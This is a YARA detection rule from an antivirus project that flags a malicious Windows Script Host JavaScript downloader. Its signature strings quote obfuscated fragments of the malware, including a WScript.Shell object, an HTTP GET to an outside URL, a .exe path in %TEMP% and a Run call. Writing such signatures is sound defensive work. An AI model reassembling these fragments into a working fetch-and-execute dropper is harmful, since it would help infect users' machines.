rule sig_20160328_cdbc935593c14aab5bb6e11864b000a0 {
  meta:
    description = "datamaliciousorder - file 20160328_cdbc935593c14aab5bb6e11864b000a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aae89ca97580a8e307b88d818142676f108ec016d5d1130ac4331d6555b096eb"

  strings:
    $s1  = "function Ndfckgogst() {return Rotqw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CgxU1kdizooqmtwz.exe\";};" fullword ascii
    $s2  = "do {WScript[Yhqqcotrzc](Jxzygjal() * 11)} while (Cgpoe[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Rotqw = function Kpdvbgtf() {return WScript[Bnucm](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Cgpoe[Ljowplm](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Lzhlrh(Zqdrmdujs, Sjiblklyx){return Zqdrmdujs - Sjiblklyx;};" fullword ascii
    $s6  = "function Nbbaf(Igegjdkne){Rotqw[\"Run\"](Igegjdkne, Tknzpq, Tknzpq);};" fullword ascii
    $s7  = "function Nzdsxn() {return ((Zjatrt == true) && (Zjatrt == Nvfplaik)) ? 1 : Tknzpq;};" fullword ascii
    $s8  = "var Uykhgizwe = new this[\"Date\"]();" fullword ascii
    $s9  = "var Zjatrt = false;" fullword ascii
    $s10 = "function Nhwpebjm(){return Bnucm;};" fullword ascii
    $s11 = " while (Vthmayazqr){" fullword ascii
    $s12 = "function Ggqpqfhch(Xwzbukamtm) {var Ajavyh = (1, 2, 3, 4, 5, Xwzbukamtm); return Ajavyh;};" fullword ascii
    $s13 = "Nvfplaik = true; " fullword ascii
    $s14 = "function Jxzygjal(){return 22;};" fullword ascii
    $s15 = "var Qrpkttyodf = false;" fullword ascii
    $s16 = "return Lzhlrh(Nsntyohmg, Yqashik);" fullword ascii
    $s17 = "function Nijusvxiwt()" fullword ascii
    $s18 = "var Nvfplaik = false;" fullword ascii
    $s19 = "Zjatrt = true; " fullword ascii
    $s20 = "function Nxbwitklc(){return Erroyzof;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}